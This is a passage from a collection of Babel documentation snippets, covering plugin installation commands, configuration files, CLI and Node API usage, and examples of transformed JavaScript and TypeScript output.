  disabled: boolean;
  options: Object;
  exec: TestFile;
  actual: TestFile;
  expected: TestFile;
};

type Suite = {
  options: Object;
  tests: Array<Test>;
  title: string;
  filename: string;
};

let fixtures: Array<Suite> = getFixtures("/User/sebmck/Projects/babel-something/test/fixtures");

----------------------------------------

TITLE: Resolving Option Conflicts
DESCRIPTION: Example of using double dash to resolve conflicts between node options and script arguments

LANGUAGE: shell
CODE:
npx babel-node --inspect --presets @babel/preset-env -- script.js --inspect

----------------------------------------

TITLE: Configuring Do Expressions Syntax Plugin in Babel Config
DESCRIPTION: JSON configuration to enable the do expressions syntax plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-do-expressions"]
}

----------------------------------------

TITLE: React JSX Development Transform Output Example
DESCRIPTION: Transformed output code showing how the plugin adds development-specific features like source location tracking and jsx-dev-runtime imports.

LANGUAGE: javascript
CODE:
import { jsxDEV as _jsxDEV } from "react/jsx-dev-runtime";

const _jsxFileName = "input.jsx";
const profile = _jsxDEV("div", {
  children: [
    _jsxDEV("img", {
      src: "avatar.png",
      className: "profile",
    }, undefined, false, { fileName: _jsxFileName, lineNumber: 3, columnNumber: 5 }, this),
    _jsxDEV("h3", {
      children: [user.firstName, user.lastName].join(" "),
    }, undefined, false, { fileName: _jsxFileName, lineNumber: 4, columnNumber: 5 }, this),
  ]},
  undefined, false, { fileName: _jsxFileName, lineNumber: 2, columnNumber: 3 }, this
);

----------------------------------------

TITLE: Transforming Unicode Characters in JavaScript Strings
DESCRIPTION: Demonstrates how the plugin transforms a string containing a U+2028 line separator character into its escaped Unicode representation.

LANGUAGE: javascript
CODE:
const ex = "before after";
//                ^ There's a U+2028 char between 'before' and 'after'

LANGUAGE: javascript
CODE:
const ex = "before\u2028after";
//                ^ There's a U+2028 char between 'before' and 'after'

----------------------------------------

TITLE: Using Top Level Await in JavaScript
DESCRIPTION: Example demonstrating the usage of top-level await in a JavaScript module.

LANGUAGE: javascript
CODE:
const val = await promise;

export { val };

----------------------------------------

TITLE: Configuring Throw Expressions Plugin in Babel Config
DESCRIPTION: JSON configuration for enabling the throw expressions syntax plugin in Babel config file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-throw-expressions"]
}

----------------------------------------

TITLE: Installing Babel Core and Node Packages
DESCRIPTION: This command installs @babel/core and @babel/node as development dependencies using npm. These packages are essential for running Babel in a Node.js environment.

LANGUAGE: shell
CODE:
npm install @babel/core @babel/node --save-dev

----------------------------------------

TITLE: TypeScript function signature for isIdentifierChar
DESCRIPTION: This TypeScript function signature describes the isIdentifierChar function, which checks if a given Unicode code point can be part of an identifier.

LANGUAGE: typescript
CODE:
function isIdentifierChar(codepoint: number): boolean

----------------------------------------

TITLE: Basic Babel Configuration
DESCRIPTION: Simple configuration to enable the class properties transform plugin without options.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-class-properties"]
}

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage of the plugin to transform JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-react-inline-elements script.js

----------------------------------------

TITLE: Using @babel/plugin-syntax-typescript via Babel CLI
DESCRIPTION: Command-line instruction to use the @babel/plugin-syntax-typescript plugin with Babel CLI.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-typescript script.js

----------------------------------------

TITLE: Plugin Installation - NPM/Yarn
DESCRIPTION: Command to install the plugin as a development dependency using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-duplicate-keys

----------------------------------------

TITLE: Configuring @babel/plugin-syntax-typescript in babel.config.json
DESCRIPTION: JSON configuration to enable the @babel/plugin-syntax-typescript plugin in a Babel project.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-typescript"]
}

----------------------------------------

TITLE: Babel Configuration File Setup
DESCRIPTION: JSON configuration to enable the import attributes syntax plugin in Babel.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-import-attributes"]
}

----------------------------------------

TITLE: Using babel-plugin-transform-regexp-constructors via CLI
DESCRIPTION: This shell command demonstrates how to use the transform-regexp-constructors plugin with Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins transform-regexp-constructors script.js

----------------------------------------

TITLE: Plugin Usage via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through Babel's Node API

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-dead-code-elimination"]
});

----------------------------------------

TITLE: Babel Node API Usage
DESCRIPTION: Example of using the function bind plugin through Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-proposal-function-bind"],
});

----------------------------------------

TITLE: Configuring Babel-loader in Webpack
DESCRIPTION: This code snippet demonstrates how to set up Babel-loader in a Webpack configuration file. It specifies the test pattern for JavaScript files, excludes node_modules, and sets up babel-loader with the @babel/preset-env preset.

LANGUAGE: JavaScript
CODE:
{
  module: {
    rules: [
      {
        test: /\.m?js$/,
        exclude: /node_modules/,
        use: {
          loader: "babel-loader",
          options: {
            presets: ['@babel/preset-env']
          }
        }
      }
    ]
  }
}

----------------------------------------

TITLE: new.target Usage in ES6 Classes
DESCRIPTION: Shows how new.target behaves in class inheritance scenarios, returning the actual constructor that was called with new.

LANGUAGE: javascript
CODE:
class Foo {
  constructor() {
    console.log(new.target);
  }
}

class Bar extends Foo {}

new Foo(); // => Foo
new Bar(); // => Bar

----------------------------------------

TITLE: Demonstrating __proto__ Assignment in JavaScript
DESCRIPTION: This snippet shows how __proto__ assignment works, allowing access to properties from the prototype object.

LANGUAGE: JavaScript
CODE:
var foo = { a: 1 };
var bar = { b: 2 };
bar.__proto__ = foo;
bar.a; // 1
bar.b; // 2

----------------------------------------

TITLE: Configuring Babel Plugin in Configuration File
DESCRIPTION: JSON configuration to enable the partial application syntax plugin in babel.config.json.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-partial-application"]
}

----------------------------------------

TITLE: Basic new.target Usage in JavaScript Functions
DESCRIPTION: Demonstrates the basic behavior of new.target in a function context, showing how it returns undefined when called normally and the constructor function when called with new.

LANGUAGE: javascript
CODE:
function Foo() {
  console.log(new.target);
}

Foo(); // => undefined
new Foo(); // => Foo

----------------------------------------

TITLE: Installing Babel Plugin for Named Capturing Groups
DESCRIPTION: Shows the npm command to install the @babel/plugin-transform-named-capturing-groups-regex plugin as a development dependency.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-transform-named-capturing-groups-regex

----------------------------------------

TITLE: Illustrating Limitations of __proto__ Assignment in JavaScript
DESCRIPTION: This snippet demonstrates a limitation of __proto__ assignment, where changes to the original object are not reflected in the assigned object.

LANGUAGE: JavaScript
CODE:
var foo = { a: 1 };
var bar = { b: 2 };
bar.__proto__ = foo;
bar.a; // 1
foo.a = 2;
bar.a; // 1 - should be 2 but remember that nothing is bound and it's a straight copy

----------------------------------------

TITLE: Parsing Module String Names in JavaScript with Babel
DESCRIPTION: This snippet demonstrates the syntax that the plugin enables @babel/parser to parse, specifically exporting a named export with a string literal as the exported name.

LANGUAGE: JavaScript
CODE:
export { smile as "😄" } from "./emojis.js";

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Demonstrates how to use the plugin via Babel CLI

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-flow-comments script.js

----------------------------------------

TITLE: Installing @babel/plugin-syntax-bigint via npm
DESCRIPTION: This command installs the @babel/plugin-syntax-bigint plugin as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-bigint

----------------------------------------

TITLE: Configuring Babel in package.json
DESCRIPTION: Specify Babel configuration within the package.json file using the 'babel' key. This approach combines Babel config with your project's package information.

LANGUAGE: json
CODE:
{
  "name": "my-package",
  "version": "1.0.0",
  "babel": {
    "presets": [ ... ],
    "plugins": [ ... ]
  }
}

----------------------------------------

TITLE: Demonstrating Unicode Sets in Regular Expressions with JavaScript
DESCRIPTION: This snippet shows an example of a regular expression using the 'v' flag for Unicode set notation, combining ASCII characters and decimal numbers.

LANGUAGE: javascript
CODE:
/[\p{ASCII}&&\p{Decimal_Number}]/v

----------------------------------------

TITLE: TypeScript function signature for isIdentifierStart
DESCRIPTION: This TypeScript function signature describes the isIdentifierStart function, which checks if a given Unicode code point can start an identifier.

LANGUAGE: typescript
CODE:
function isIdentifierStart(codepoint: number): boolean

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line interface usage example for transforming JavaScript files using the regenerator plugin.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-regenerator script.js

----------------------------------------

TITLE: Node API Usage
DESCRIPTION: Example of using the regenerator transform plugin programmatically via the Babel Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-regenerator"],
});

----------------------------------------

TITLE: Using Object.assign Transform Plugin via Babel CLI
DESCRIPTION: Command to use the plugin with Babel CLI for transforming a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-transform-object-assign script.js

----------------------------------------

TITLE: Installing @babel/generator Package
DESCRIPTION: Command to install the @babel/generator package as a dev dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/generator

----------------------------------------

TITLE: CLI Usage Example
DESCRIPTION: Command line usage example for transforming JavaScript files using the private methods plugin.

LANGUAGE: shell
CODE:
$ babel --plugins @babel/plugin-transform-private-methods script.js

----------------------------------------

TITLE: Configuring Babel to Use Object.assign Transform Plugin
DESCRIPTION: JSON configuration to add the plugin to a Babel project using a configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-transform-object-assign"]
}

----------------------------------------

TITLE: Basic Babel Configuration
DESCRIPTION: Basic configuration for the arrow functions transform plugin without any options.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-arrow-functions"]
}

----------------------------------------

TITLE: Configuring Babel JSON Strings Plugin
DESCRIPTION: Configuration setup in babel.config.json to enable the JSON strings syntax plugin.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-json-strings"]
}

----------------------------------------

TITLE: Basic JSON Module Import Example
DESCRIPTION: Shows how to import JSON modules using the new syntax

LANGUAGE: javascript
CODE:
import data from "./data.json" with { type: "json" };

----------------------------------------

TITLE: Applying Unicode Regex Transform via Babel Node API
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-unicode-regex plugin programmatically with Babel's Node API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-unicode-regex"],
});

----------------------------------------

TITLE: Installing @babel/plugin-transform-regexp-modifiers via npm
DESCRIPTION: This command installs the Babel plugin as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-regexp-modifiers

----------------------------------------

TITLE: Using Babel Minify via CLI
DESCRIPTION: Command line usage of the minify preset

LANGUAGE: shell
CODE:
babel script.js --presets minify

----------------------------------------

TITLE: Installing Babel Do Expressions Syntax Plugin via NPM/Yarn
DESCRIPTION: Command to install the @babel/plugin-syntax-do-expressions plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-do-expressions

----------------------------------------

TITLE: Installing @babel/types
DESCRIPTION: Command to install the @babel/types package using npm or yarn.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/types

----------------------------------------

TITLE: Installing @babel/plugin-syntax-flow via npm
DESCRIPTION: Command to install the @babel/plugin-syntax-flow plugin as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-flow

----------------------------------------

TITLE: Installing Babel ES2015 Preset
DESCRIPTION: Command to install the @babel/preset-es2015 package using npm package manager.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-es2015

----------------------------------------

TITLE: Installing @babel/plugin-proposal-function-sent via npm
DESCRIPTION: Command to install the @babel/plugin-proposal-function-sent plugin as a development dependency using npm.

LANGUAGE: Shell
CODE:
npm install --save-dev @babel/plugin-proposal-function-sent

----------------------------------------

TITLE: Node API Usage for TypeScript Transformation
DESCRIPTION: JavaScript code showing how to use Babel's Node API to transform TypeScript

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  presets: ["@babel/preset-typescript"],
  filename: 'script.ts',
});

----------------------------------------

TITLE: Applying the Destructuring Private Plugin via Node API
DESCRIPTION: JavaScript code snippet demonstrating how to use the destructuring private plugin with Babel's Node API for code transformation.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-proposal-destructuring-private"],
});

----------------------------------------

TITLE: Configuring babel-preset-env for current Node.js version
DESCRIPTION: JSON configuration for babel-preset-env targeting the current Node.js version.

LANGUAGE: json
CODE:
{
  "presets": [
    [
      "env",
      {
        "targets": {
          "node": "current"
        }
      }
    ]
  ]
}

----------------------------------------

TITLE: Applying block-scoped-functions Plugin with Babel Node API
DESCRIPTION: Illustrates how to use the @babel/plugin-transform-block-scoped-functions plugin programmatically with Babel's Node API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-block-scoped-functions"],
});

----------------------------------------

TITLE: Optional Chaining with Non-null Assertions in TypeScript
DESCRIPTION: Shows the improved interaction between optional chaining and non-null assertions in TypeScript 3.9 and Babel 7.10.0.

LANGUAGE: TypeScript
CODE:
foo?.bar!.baz

----------------------------------------

TITLE: Configuring Babel JSX Syntax Plugin
DESCRIPTION: JSON configuration for enabling the JSX syntax plugin in babel.config.json

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-jsx"]
}

----------------------------------------

TITLE: Node API Usage
DESCRIPTION: Example of using the arrow functions transform plugin programmatically via the Node.js API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-arrow-functions"],
});

----------------------------------------

TITLE: Applying Property Literals Transform via Babel Node API
DESCRIPTION: This JavaScript code snippet shows how to use the @babel/plugin-transform-property-literals plugin programmatically with the Babel Core API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-property-literals"],
});

----------------------------------------

TITLE: Configuring @babel/preset-stage-0 in babel.config.json
DESCRIPTION: JSON configuration to enable @babel/preset-stage-0 in a Babel project's configuration file.

LANGUAGE: json
CODE:
{
  "presets": ["@babel/preset-stage-0"]
}

----------------------------------------

TITLE: Implementing Babel Plugin via Node API
DESCRIPTION: JavaScript code showing how to use the plugin programmatically through the Babel Core API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-numeric-literals"]
});

----------------------------------------

TITLE: Installing babel-plugin-transform-regexp-constructors via npm
DESCRIPTION: This command installs the babel-plugin-transform-regexp-constructors as a dev dependency using npm.

LANGUAGE: Shell
CODE:
npm install babel-plugin-transform-regexp-constructors --save-dev

----------------------------------------

TITLE: Using class properties syntax plugin via Babel CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-class-properties plugin with Babel CLI for transforming JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-class-properties script.js

----------------------------------------

TITLE: Applying babel-plugin-transform-regexp-constructors with Node.js API
DESCRIPTION: This JavaScript code shows how to use the transform-regexp-constructors plugin with Babel's Node.js API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["transform-regexp-constructors"],
});

----------------------------------------

TITLE: Transforming RegExp with 's' Modifier in JavaScript
DESCRIPTION: This snippet illustrates how the plugin handles the 's' (dotAll) inline modifier. It replaces the modifier with a character set that includes all characters.

LANGUAGE: javascript
CODE:
// matches \na and aa, but not \n\n
const regex = /(?s:.)./;

LANGUAGE: javascript
CODE:
const regex = /(?:[\s\S])./;

----------------------------------------

TITLE: Using the Destructuring Private Plugin via Babel CLI
DESCRIPTION: Command to use the destructuring private plugin with Babel CLI for transforming a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins @babel/plugin-proposal-destructuring-private script.js

----------------------------------------

TITLE: Installing Babel Plugin Transform Literals - Shell
DESCRIPTION: Command to install the @babel/plugin-transform-literals plugin using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-literals

----------------------------------------

TITLE: Babel Node Script Arguments
DESCRIPTION: Example showing proper placement of Babel options and script arguments

LANGUAGE: shell
CODE:
npx babel-node --arg-for-babel script.js --arg-for-script.js

----------------------------------------

TITLE: Configuring Babel to Use the Destructuring Private Plugin
DESCRIPTION: JSON configuration for enabling the destructuring private plugin in Babel. It also shows how to order it with other class feature plugins.

LANGUAGE: JSON
CODE:
{
  "plugins": ["@babel/plugin-proposal-destructuring-private"]
}

LANGUAGE: JSON
CODE:
{
  "plugins": [
    "@babel/plugin-proposal-destructuring-private",
    "@babel/plugin-transform-class-properties"
  ]
}

----------------------------------------

TITLE: Installing Babel TypeScript Preset
DESCRIPTION: Shows the command to install the Babel TypeScript preset for handling TypeScript syntax.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-typescript

----------------------------------------

TITLE: CLI Usage with Flow Preset
DESCRIPTION: Command line usage example for using the Flow preset with Babel CLI.

LANGUAGE: shell
CODE:
babel --presets @babel/preset-flow script.js

----------------------------------------

TITLE: Applying proto-to-assign Plugin via Node API
DESCRIPTION: This JavaScript code shows how to use the @babel/plugin-transform-proto-to-assign plugin programmatically with the Babel Core API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-proto-to-assign"],
});

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the class properties transform plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-class-properties

----------------------------------------

TITLE: Configuring @babel/plugin-syntax-function-sent in babel.config.json
DESCRIPTION: JSON configuration to enable the @babel/plugin-syntax-function-sent plugin in a Babel project configuration file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-syntax-function-sent"]
}

----------------------------------------

TITLE: Installing Webpacker in Rails Project
DESCRIPTION: These shell commands install the Webpacker gem and run the Webpacker installer for Rails. This sets up Webpacker in the Rails project, enabling JavaScript compilation and transpilation with Babel.

LANGUAGE: shell
CODE:
bundle install
bundle exec rails webpacker:install

----------------------------------------

TITLE: Using Babel Plugin via Node API
DESCRIPTION: Shows how to use the @babel/plugin-transform-template-literals plugin programmatically via the Babel core Node.js API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-template-literals"],
});

----------------------------------------

TITLE: Using Numeric Separators with Binary Literals in JavaScript
DESCRIPTION: Shows how to use numeric separators in binary number representation for better readability and bit manipulation.

LANGUAGE: javascript
CODE:
let nibbles = 0b1010_0001_1000_0101;

// Is bit 7 on? It sure is!
// 0b1010_0001_1000_0101
//             ^
//
// We can double check:
console.log(!!(nibbles & (1 << 7))); // true

----------------------------------------

TITLE: Configuring TypeScript Preset for Declare Fields
DESCRIPTION: Example of configuring @babel/preset-typescript to allow declare keyword in class fields.

LANGUAGE: json
CODE:
{
  "presets": [
    ["@babel/preset-typescript", {
      "allowDeclareFields": true
    }]
  ]
}

----------------------------------------

TITLE: Using babel-plugin-minify-infinity via Babel CLI
DESCRIPTION: This shell command demonstrates how to use the minify-infinity plugin with the Babel CLI to transform a JavaScript file.

LANGUAGE: Shell
CODE:
babel --plugins minify-infinity script.js

----------------------------------------

TITLE: Using Babel Plugin via Node API (JavaScript)
DESCRIPTION: JavaScript code to use the plugin programmatically with Babel core.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-private-property-in-object"],
});

----------------------------------------

TITLE: Installing Babel Function Bind Syntax Plugin
DESCRIPTION: NPM/Yarn command to install the @babel/plugin-syntax-function-bind plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-syntax-function-bind

----------------------------------------

TITLE: Configuring @babel/plugin-transform-modules-umd with exactGlobals Option
DESCRIPTION: Example configuration for the @babel/plugin-transform-modules-umd plugin using the exactGlobals option for more flexible global name mapping.

LANGUAGE: JSON
CODE:
{
  "plugins": [
    "@babel/plugin-external-helpers",
    [
      "@babel/plugin-transform-modules-umd",
      {
        "globals": {
          "my/custom/module/name": "My.Custom.Module.Name"
        },
        "exactGlobals": true
      }
    ]
  ],
  "moduleId": "my/custom/module/name"
}

----------------------------------------

TITLE: Safari Class Field Initializer Bug Example - JavaScript
DESCRIPTION: Demonstrates the Safari bug with parenthesized expressions in class fields that affects versions before Safari 16.

LANGUAGE: javascript
CODE:
{
  let a = [3];
  new class {
    c = (a)[0];
  };
}

----------------------------------------

TITLE: Configuring babel-plugin-transform-regexp-constructors in babel.config.json
DESCRIPTION: This JSON configuration adds the transform-regexp-constructors plugin to the Babel configuration file.

LANGUAGE: JSON
CODE:
{
  "plugins": ["transform-regexp-constructors"]
}

----------------------------------------

TITLE: Configuring Babel Numeric Separator Plugin
DESCRIPTION: JSON configuration for enabling the numeric separator plugin in Babel.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-numeric-separator"]
}

----------------------------------------

TITLE: Importing utility functions from @babel/helper-validator-identifier
DESCRIPTION: This code snippet shows how to import the various utility functions provided by the @babel/helper-validator-identifier package in a JavaScript file.

LANGUAGE: javascript
CODE:
import {
  isIdentifierName,
  isIdentifierStart,
  isIdentifierChar,
  isReservedWord,
  isStrictBindOnlyReservedWord,
  isStrictBindReservedWord,
  isStrictReservedWord,
  isKeyword,
} from "@babel/helper-validator-identifier";

----------------------------------------

TITLE: Example NODE_ENV Transformation Output
DESCRIPTION: Shows how the process.env.NODE_ENV comparisons are transformed into boolean literals.

LANGUAGE: javascript
CODE:
true;
false;

----------------------------------------

TITLE: Decorator Migration Command
DESCRIPTION: Shell command to upgrade legacy decorators to the new proposal format using the wrap-legacy-decorators utility

LANGUAGE: shell
CODE:
npx wrap-legacy-decorators src/file-with-decorators.js --decorators-before-export --write

----------------------------------------

TITLE: Installing Babel ES2016 Preset Package
DESCRIPTION: Command to install the @babel/preset-es2016 package as a development dependency using npm.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/preset-es2016

----------------------------------------

TITLE: Babel Configuration Setup
DESCRIPTION: JSON configuration to enable the plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-async-generator-functions"]
}

----------------------------------------

TITLE: Applying flow-strip-types plugin using Babel Node API
DESCRIPTION: Demonstrates how to use the plugin programmatically with Babel's Node.js API.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-flow-strip-types"],
});

----------------------------------------

TITLE: Function Bind with DOM QuerySelector
DESCRIPTION: Demonstrates using function bind operator with document.querySelectorAll to enable array method chaining on NodeList results.

LANGUAGE: javascript
CODE:
const { map, filter } = Array.prototype;

let sslUrls = document
  .querySelectorAll("a")
  ::map(node => node.href)
  ::filter(href => href.substring(0, 5) === "https");

console.log(sslUrls);

LANGUAGE: javascript
CODE:
const { map, filter } = Array.prototype;

let sslUrls = document.querySelectorAll("a");
sslUrls = map.call(sslUrls, node => node.href);
sslUrls = filter.call(sslUrls, href => href.substring(0, 5) === "https");

console.log(sslUrls);

----------------------------------------

TITLE: Plugin Configuration in Babel Config
DESCRIPTION: JSON configuration to enable the destructuring transform plugin in babel.config.json file.

LANGUAGE: json
CODE:
{
  "plugins": ["@babel/plugin-transform-destructuring"]
}

----------------------------------------

TITLE: Node API Integration
DESCRIPTION: JavaScript code showing how to use the import attributes syntax plugin with Babel's Node API.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-import-attributes"]
});

----------------------------------------

TITLE: Configuring Gulp Task for Babel Transpilation
DESCRIPTION: Shows how to modify a Gulp task to use Babel instead of a JSX-specific transpiler for processing JavaScript files with JSX syntax.

LANGUAGE: JavaScript
CODE:
gulp.src('views/**/*.js')
    .pipe(jsx())
    .pipe(gulp.dest('dist'));

LANGUAGE: JavaScript
CODE:
gulp.src('views/**/*.js')
    .pipe(babel())
    .pipe(gulp.dest('dist'));

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the plugin as a development dependency.

LANGUAGE: shell
CODE:
npm install babel-plugin-transform-node-env-inline --save-dev

----------------------------------------

TITLE: Plugin Usage via CLI
DESCRIPTION: Command line usage of the plugin to transform JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-transform-async-generator-functions script.js

----------------------------------------

TITLE: Demonstrating ignoreFunctionLength behavior in JavaScript
DESCRIPTION: This JavaScript snippet shows the difference in function length when the ignoreFunctionLength assumption is enabled vs. the spec behavior.

LANGUAGE: javascript
CODE:
// Spec behavior
function bar1(arg1 = 1) {}
bar1.length; // 0

// ignoreFunctionLength: true
function bar1(arg1 = 1) {}
bar1.length; // 1

----------------------------------------

TITLE: Applying babel-plugin-minify-builtins with Babel Node API in JavaScript
DESCRIPTION: Demonstrates how to use the minify-builtins plugin programmatically with Babel's Node API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-builtins"]
});

----------------------------------------

TITLE: Transforming Reserved Words with Babel Plugin
DESCRIPTION: This snippet demonstrates how the plugin transforms ES3 reserved words in JavaScript code. It renames the variable 'abstract' to '_abstract' to avoid conflicts in ES3 environments.

LANGUAGE: JavaScript
CODE:
var abstract = 1;
var x = abstract + 1;

LANGUAGE: JavaScript
CODE:
var _abstract = 1;
var x = _abstract + 1;

----------------------------------------

TITLE: Installing @babel/helper-validator-identifier via npm
DESCRIPTION: This command installs the @babel/helper-validator-identifier package using npm. It can also be installed using yarn.

LANGUAGE: shell
CODE:
npm install @babel/helper-validator-identifier

----------------------------------------

TITLE: Applying babel-plugin-minify-infinity using Babel Node API
DESCRIPTION: This JavaScript code snippet shows how to use the minify-infinity plugin programmatically with the Babel Node API to transform code.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["minify-infinity"]
});

----------------------------------------

TITLE: Applying object rest/spread syntax plugin via Babel Node API
DESCRIPTION: JavaScript code to use the @babel/plugin-syntax-object-rest-spread plugin with Babel's Node API. This enables parsing of object rest/spread syntax for the provided code string.

LANGUAGE: javascript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-syntax-object-rest-spread"]
});

----------------------------------------

TITLE: Loading ES6 Modules with RequireJS Babel Plugin
DESCRIPTION: Example showing how to use the es6 plugin prefix to load ES6 modules through RequireJS with Babel transpilation.

LANGUAGE: javascript
CODE:
define(["es6!your-es6-module"], function (module) {
  // ...
});

----------------------------------------

TITLE: Advanced Babel Configuration
DESCRIPTION: Configuration with the spec option enabled for stricter arrow function transformation.

LANGUAGE: json
CODE:
{
  "plugins": [["@babel/plugin-transform-arrow-functions", { "spec": true }]]
}

----------------------------------------

TITLE: Plugin Installation Command
DESCRIPTION: NPM command to install the CommonJS transform plugin as a dev dependency.

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-modules-commonjs

----------------------------------------

TITLE: Using Babel Node API for Nullish Coalescing Operator Transform
DESCRIPTION: Demonstrates how to use the Babel Node API to programmatically transform code using the nullish coalescing operator plugin.

LANGUAGE: JavaScript
CODE:
require("@babel/core").transformSync("code", {
  plugins: ["@babel/plugin-transform-nullish-coalescing-operator"],
});

----------------------------------------

TITLE: Transforming Object Property Shorthand Syntax in JavaScript
DESCRIPTION: Demonstrates how the plugin transforms object property shorthand syntax to traditional property declarations.

LANGUAGE: javascript
CODE:
var o = { a, b, c };

LANGUAGE: javascript
CODE:
var o = { a: a, b: b, c: c };

----------------------------------------

TITLE: Configuring Browserify for Babel Transpilation
DESCRIPTION: Shows the command line change needed to use Babel instead of Reactify with Browserify for transpiling JSX.

LANGUAGE: Shell
CODE:
$ browserify -t reactify main.js

LANGUAGE: Shell
CODE:
$ browserify -t babelify main.js

----------------------------------------

TITLE: Updating TSClassImplements and TSInterfaceHeritage AST in Babel 8
DESCRIPTION: The AST structure for class implements and interface extends has changed in Babel 8. TSExpressionWithTypeArguments is split into TSClassImplements and TSInterfaceHeritage.

LANGUAGE: typescript
CODE:
class C implements X<T> {}

// AST in Babel 7
{
  type: "ClassDeclaration",
  id: Identifier("C"),
  implements: [
    {
      type: "TSExpressionWithTypeArguments",
      expression: Identifier("X"),
      typeParameters: {
        type: "TSTypeParameterInstantiation",
        params: [TSTypeReference(Identifier("T"))]
      }
    }
  ],
  body: ClassBody([]),
}

// AST in Babel 8
{
  type: "ClassDeclaration",
  id: Identifier("C"),
  implements: [
    {
      type: "TSClassImplements",
      expression: Identifier("X"),
      typeArguments: {
        type: "TSTypeParameterInstantiation",
        params: [TSTypeReference(Identifier("T"))]
      }
    }
  ],
  body: ClassBody([]),
}

----------------------------------------

TITLE: Package Installation Command
DESCRIPTION: NPM command to install the plugin as a development dependency

LANGUAGE: shell
CODE:
npm install --save-dev @babel/plugin-transform-dynamic-import

----------------------------------------

TITLE: Using Babel Plugin for Logical Assignment Operators Syntax via CLI
DESCRIPTION: Shell command to use the @babel/plugin-syntax-logical-assignment-operators plugin with Babel CLI for transforming JavaScript files.

LANGUAGE: shell
CODE:
babel --plugins @babel/plugin-syntax-logical-assignment-operators script.js

----------------------------------------

TITLE: Importing and Using getFunctionArity Helper in JavaScript
DESCRIPTION: This snippet shows how to import the getFunctionArity helper from @babel/helper-get-function-arity and use it within a function. The helper is used to determine the arity (number of arguments) of a given function.

LANGUAGE: JavaScript
